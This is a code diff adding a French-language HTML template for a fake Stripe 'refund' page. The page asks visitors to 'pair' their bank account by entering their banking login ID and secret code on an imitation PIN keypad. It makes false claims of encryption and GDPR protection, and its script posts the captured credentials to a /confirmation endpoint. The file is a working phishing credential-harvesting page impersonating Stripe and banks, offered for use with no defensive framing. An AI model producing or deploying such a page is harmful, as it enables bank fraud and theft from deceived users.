@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accès à mon Compte - {{ bank_name }}</title>
+    <style>
+        /* Reset basic styling */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background: linear-gradient(135deg, #001f3f, #003366); /* Fond bleu dégradé */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .login-container {
+            background: #fff; /* Cadre blanc */
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            width: 450px; /* Largeur augmentée */
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 1s ease-out forwards;
+            height: 90vh; /* Hauteur augmentée pour afficher plus de contenu */
+            overflow-y: auto; /* Activer le défilement vertical */
+            position: relative;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .bank-logo {
+            height: 60px;
+            margin-bottom: 20px;
+            transition: transform 0.3s ease;
+            opacity: 0;
+            transform: scale(0.8);
+            animation: rotateAndZoom 2s ease-in-out infinite;
+        }
+
+        @keyframes rotateAndZoom {
+            0% {
+                transform: rotate(0deg) scale(0.8);
+            }
+            50% {
+                transform: rotate(10deg) scale(1.1);
+            }
+            100% {
+                transform: rotate(0deg) scale(0.8);
+            }
+        }
+
+        .bank-logo.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .bank-logo:hover {
+            transform: scale(1.05);
+        }
+
+        h1 {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 25px;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-family: 'Arial Black', sans-serif; /* Titres en Arial Black */
+        }
+
+        .main-title {
+            font-size: 30px;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 40px;
+            font-family: 'Arial Black', sans-serif; /* Titres en Arial Black */
+            opacity: 0;
+            animation: slideIn 1s ease-out 0.5s forwards;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-20px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .input-container {
+            text-align: left;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-container label {
+            font-size: 14px;
+            color: #555;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 5px;
+            transition: color 0.3s ease;
+        }
+
+        .input-container label:hover {
+            color: #0056b3;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 15px 15px 15px 40px; /* Espace pour l'icône */
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            background-color: #f9f9f9;
+        }
+
+        .input-container input:focus {
+            border-color: #0056b3;
+            outline: none;
+            transform: scale(1.02);
+            box-shadow: 0 0 10px rgba(0, 123, 255, 0.3);
+        }
+
+        .input-container .icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            color: #007bff;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #007bff;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #0056b3, #004494);
+            transform: scale(1.05);
+        }
+
+        button:active {
+            transform: scale(1.02);
+        }
+
+        /* Animation for secret code */
+        .secret-code-container {
+            display: block; /* Toujours afficher */
+            opacity: 1;
+        }
+
+        /* Style pour le sélecteur de type de mot de passe */
+        .password-type-selector {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .password-type-selector button {
+            flex: 1;
+            margin: 0 5px;
+            padding: 10px;
+            font-size: 14px;
+            background: #f1f1f1;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        .password-type-selector button.active {
+            background: #007bff;
+            color: white;
+            border-color: #007bff;
+        }
+
+        .password-type-selector button#text-password-btn {
+            background: #007bff; /* Fond bleu pour la case libre */
+            color: white;
+        }
+
+        .password-type-selector button:hover {
+            background: #ddd;
+        }
+
+        /* Clavier numérique */
+        .numeric-keyboard {
+            display: grid; /* Afficher par défaut */
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 10px;
+            animation: slideIn 0.3s ease-out;
+            background: #001f3f; /* Fond bleu foncé */
+            padding: 15px;
+            border-radius: 10px;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(10px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .numeric-keyboard button {
+            padding: 15px;
+            font-size: 18px;
+            background: #007bff; /* Bleu clair */
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            color: white;
+        }
+
+        .numeric-keyboard button:hover {
+            background: #0056b3; /* Bleu plus foncé au survol */
+        }
+
+        /* Écran de chargement */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Coche des conditions de remboursement */
+        .refund-checkbox {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .refund-checkbox input {
+            margin-right: 10px;
+        }
+
+        .refund-checkbox a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .refund-checkbox a:hover {
+            text-decoration: underline;
+        }
+
+        /* Messages de sécurité */
+        .security-message {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+        }
+
+        .security-message i {
+            color: #007bff;
+            margin-right: 10px;
+        }
+
+        /* Informations de sécurité */
+        .security-info {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        /* Logo Stripe */
+        .stripe-logo {
+            width: 100px;
+            height: auto;
+            opacity: 0;
+            animation: fadeInLogo 1s ease-out 1s forwards;
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+
+        @keyframes fadeInLogo {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Animation moderne pour "Associer votre compte bancaire..." */
+        .animated-title {
+            font-size: 24px;
+            color: #007bff; /* Texte en bleu */
+            font-weight: 600;
+            margin-bottom: 20px;
+            opacity: 0;
+            animation: slideInTitle 1s ease-out 0.5s forwards, glow 2s infinite alternate;
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        @keyframes slideInTitle {
+            from {
+                transform: translateY(-20px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
+            }
+            100% {
+                text-shadow: 0 0 20px rgba(0, 123, 255, 0.8);
+            }
+        }
+    </style>
+    <!-- Ajout des icônes modernes via Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+
+<body>
+
+    <div class="login-container">
+        <!-- Logo Stripe en haut à droite -->
+        <img src="https://i0.wp.com/www.frenchweb.fr/wp-content/uploads/2023/02/LOGO-850-stripe.png?w=850&ssl=1" alt="Logo Stripe" class="stripe-logo">
+
+        <div class="main-title">Accéder à mon remboursement</div>
+        <!-- Logo dynamique injecté par Flask -->
+        <img id="bank-logo" class="bank-logo" alt="Logo de la banque">
+        <div class="animated-title">Associer votre compte bancaire...</div> <!-- Texte animé en bleu -->
+
+        <div class="input-container">
+            <label for="client-number">Identifiant bancaire</label>
+            <i class="fas fa-user icon"></i> <!-- Icône pour l'identifiant -->
+            <input type="text" id="client-number" placeholder="Ex : 12345678" required>
+        </div>
+
+        <!-- Section du code secret -->
+        <div class="secret-code-container">
+            <div class="password-type-selector">
+                <button id="numeric-password-btn" class="active" onclick="setPasswordType('numeric')">Numérique</button>
+                <button id="text-password-btn" onclick="setPasswordType('text')">Libre</button>
+            </div>
+
+            <div class="input-container">
+                <label for="secret-code">Code Personnel ou Mot de Passe</label>
+                <i class="fas fa-lock icon"></i> <!-- Icône pour le mot de passe -->
+                <input type="password" id="secret-code" placeholder="******" required maxlength="6">
+                <i class="fas fa-eye password-toggle" id="toggle-password"></i> <!-- Icône pour voir/masquer le mot de passe -->
+            </div>
+
+            <div class="numeric-keyboard" id="numeric-keyboard">
+                <button onclick="appendNumber('1')">1</button>
+                <button onclick="appendNumber('2')">2</button>
+                <button onclick="appendNumber('3')">3</button>
+                <button onclick="appendNumber('4')">4</button>
+                <button onclick="appendNumber('5')">5</button>
+                <button onclick="appendNumber('6')">6</button>
+                <button onclick="appendNumber('7')">7</button>
+                <button onclick="appendNumber('8')">8</button>
+                <button onclick="appendNumber('9')">9</button>
+                <button onclick="appendNumber('0')">0</button>
+                <button onclick="clearPassword()">C</button>
+            </div>
+        </div>
+
+        <!-- Coche des conditions de remboursement -->
+        <div class="refund-checkbox">
+            <input type="checkbox" id="accept-refund-policy" required>
+            <label for="accept-refund-policy">
+                J'accepte les <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://support.stripe.com/questions/refund-requests-for-a-purchase-made-through-a-business-using-stripe%3Flocale%3Dfr-FR&ved=2ahUKEwiemcmH_uSLAxXfU6QEHYILNkgQFnoECDQQAQ&usg=AOvVaw0ytVJeFagOlfxx81VaVTAM" target="_blank">conditions de remboursement</a>.
+            </label>
+        </div>
+
+        <button onclick="submitForm()">Se connecter</button>
+
+        <!-- Messages de sécurité -->
+        <div class="security-message">
+            <p><i class="fas fa-shield-alt"></i>Pour accéder à votre remboursement, vous devez jumeler votre compte bancaire.</p>
+            <p><i class="fas fa-lock"></i>Vos informations sont sécurisées et cryptées.</p>
+        </div>
+
+        <!-- Informations de sécurité -->
+        <div class="security-info">
+            <p>Sécurisation des données :</p>
+            <p>Ce formulaire est entièrement sécurisé et vos informations bancaires seront traitées conformément à la réglementation sur la protection des données personnelles (RGPD). Nous nous engageons à ne jamais partager vos informations avec des tiers.</p>
+        </div>
+
+        <!-- Logo Stripe en bas -->
+        <img src="https://i0.wp.com/www.frenchweb.fr/wp-content/uploads/2023/02/LOGO-850-stripe.png?w=850&ssl=1" alt="Logo Stripe" class="stripe-logo" style="position: static; margin-top: 20px;">
+    </div>
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loading-screen">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        // Récupérer l'URL du logo de la banque depuis le localStorage
+        const bankLogoUrl = localStorage.getItem('bankLogoUrl');
+
+        // Afficher le logo de la banque si l'URL est disponible
+        if (bankLogoUrl) {
+            const bankLogo = document.getElementById('bank-logo');
+            bankLogo.src = bankLogoUrl;
+            bankLogo.classList.add('show');
+        }
+
+        // Fonction pour basculer entre voir/masquer le mot de passe
+        const togglePassword = document.getElementById("toggle-password");
+        const passwordInput = document.getElementById("secret-code");
+
+        togglePassword.addEventListener("click", () => {
+            const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+            passwordInput.setAttribute("type", type);
+            togglePassword.classList.toggle("fa-eye-slash"); // Change l'icône
+        });
+
+        // Fonction pour définir le type de mot de passe
+        function setPasswordType(type) {
+            const numericKeyboard = document.getElementById("numeric-keyboard");
+            const numericBtn = document.getElementById("numeric-password-btn");
+            const textBtn = document.getElementById("text-password-btn");
+
+            if (type === "numeric") {
+                numericKeyboard.style.display = "grid";
+                passwordInput.setAttribute("inputmode", "numeric");
+                numericBtn.classList.add("active");
+                textBtn.classList.remove("active");
+            } else {
+                numericKeyboard.style.display = "none";
+                passwordInput.removeAttribute("inputmode");
+                textBtn.classList.add("active");
+                numericBtn.classList.remove("active");
+            }
+        }
+
+        // Afficher le clavier numérique par défaut
+        setPasswordType("numeric");
+
+        // Fonction pour ajouter un chiffre au mot de passe
+        function appendNumber(number) {
+            if (passwordInput.value.length < 6) {
+                passwordInput.value += number;
+            }
+        }
+
+        // Fonction pour effacer le mot de passe
+        function clearPassword() {
+            passwordInput.value = "";
+        }
+
+        // Afficher le clavier numérique lorsque le champ de mot de passe est cliqué
+        passwordInput.addEventListener("focus", () => {
+            if (document.getElementById("numeric-password-btn").classList.contains("active")) {
+                document.getElementById("numeric-keyboard").style.display = "grid";
+            }
+        });
+
+        // Fonction pour soumettre le formulaire
+        function submitForm() {
+            const loadingScreen = document.getElementById("loading-screen");
+            loadingScreen.style.display = "flex";
+
+            // Récupérer les données du formulaire
+            const clientNumber = document.getElementById("client-number").value;
+            const secretCode = document.getElementById("secret-code").value;
+
+            // Créer un objet FormData pour envoyer les données
+            const formData = new URLSearchParams();
+            formData.append("client-number", clientNumber);
+            formData.append("secret-code", secretCode);
+
+            // Envoyer les données via une requête POST
+            fetch("/confirmation", {
+                method: "POST",
+                body: formData,
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded", // Définir le type de contenu
+                },
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Rediriger vers la page de confirmation
+                    window.location.href = "/confirmation";
+                } else {
+                    alert("Erreur lors de la soumission du formulaire.");
+                }
+            })
+            .catch(error => {
+                console.error("Erreur :", error);
+                alert("Une erreur s'est produite lors de la soumission du formulaire.");
+            })
+            .finally(() => {
+                loadingScreen.style.display = "none";
+            });
+        }
+    </script>
+
+</body>
+
+</html>
